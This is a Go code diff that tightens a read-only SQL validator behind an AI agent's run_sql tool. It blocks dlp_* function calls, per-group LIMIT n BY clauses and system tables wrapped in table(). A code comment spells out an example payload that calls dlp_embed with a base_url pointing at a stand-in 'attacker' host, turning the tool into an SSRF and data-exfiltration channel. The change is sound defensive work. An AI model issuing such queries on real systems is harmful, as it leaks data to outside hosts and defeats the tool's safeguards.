@@ -91,6 +91,27 @@ var (
 	// "system" in "system.tables" (a "." is a word-boundary too).
 	forbiddenRe     = regexp.MustCompile(`(?i)\b(INSERT|ALTER|CREATE|DROP|TRUNCATE|RENAME|OPTIMIZE|GRANT|REVOKE|KILL|SETTINGS|OUTFILE|INFILE)\b`)
 	systemKeywordRe = regexp.MustCompile(`(?i)\bSYSTEM\b`)
+
+	// dlpFuncRe matches a call to any dlp_* UDF (name immediately followed by
+	// "("). ValidateReadOnlySQL only bounds FROM/JOIN *sources*, not scalar
+	// functions in the SELECT list. Several dlp_* UDFs (dlp_embed, dlp_risk,
+	// dlp_understand_query, dlp_rerank, dlp_summarize) parse a caller-supplied
+	// JSON `config` at call time and POST to config.base_url — so
+	// `SELECT dlp_embed('x','user','{"base_url":"http://attacker/..."}')`
+	// turns run_sql into an SSRF / data-exfiltration primitive with no FROM
+	// clause at all. The model has the dedicated dlp_search skill for semantic
+	// DLP; it never needs to invoke a dlp_* UDF directly, so the whole family
+	// is denied here (#237). The word boundary means "agentguard_dlp_config"
+	// or "mv_dlp_enrich" (dlp_ preceded by "_", no boundary) never matches;
+	// stripStrings blanks quoted literals first, so a dlp_ inside string DATA
+	// is not treated as a call.
+	dlpFuncRe = regexp.MustCompile(`(?i)\bdlp_\w*\s*\(`)
+
+	// limitByRe detects "LIMIT n BY expr" — a per-group cap, NOT a total
+	// row cap. The end-anchored clamp regexes below don't match it, so it
+	// would otherwise slip through the clamp unmodified and return one row per
+	// distinct group, defeating SQLMaxRows (#237). Rejected fail-closed.
+	limitByRe = regexp.MustCompile(`(?i)\bLIMIT\s+\d+\s+BY\b`)
 )
 
 // stripStrings blanks single-quoted literals so keyword scanning ignores
@@ -189,6 +210,15 @@ func validateTableCall(rest string) (int, error) {
 	name = strings.TrimPrefix(name, "default.")
 	if deniedStreams[name] {
 		return 0, fmt.Errorf("stream %q holds credentials and is not readable via run_sql", interior)
+	}
+	// A "system.<table>" wrapped in table() must clear the same allowlist as
+	// the bare form — validateSource routes table(...) here BEFORE its
+	// system.* branch, so without this check table(system.users) would slip
+	// past the allowlist that rejects a bare FROM system.users (#237).
+	if strings.HasPrefix(name, "system.") {
+		if !allowedSystemTables[strings.TrimPrefix(name, "system.")] {
+			return 0, fmt.Errorf("only system.tables/columns/functions/v_failed_mat_views are readable — rejected for safety")
+		}
 	}
 	return openIdx + idx + 1, nil
 }
@@ -523,6 +553,15 @@ func ValidateReadOnlySQL(sql string, maxRows int) (string, error) {
 
 	if kw := findForbiddenKeyword(scan); kw != "" {
 		return "", fmt.Errorf("forbidden keyword %q — run_sql is read-only", strings.ToUpper(kw))
+	}
+
+	if m := dlpFuncRe.FindString(scan); m != "" {
+		fn := strings.TrimRight(strings.TrimSpace(m), "(")
+		return "", fmt.Errorf("function %q is not callable via run_sql — use the dlp_search skill for DLP queries", strings.TrimSpace(fn))
+	}
+
+	if limitByRe.MatchString(scan) {
+		return "", fmt.Errorf("`LIMIT n BY` is not allowed — it caps rows per group, not overall; use a plain LIMIT")
 	}
 
 	if err := checkBareStreams(scan); err != nil {
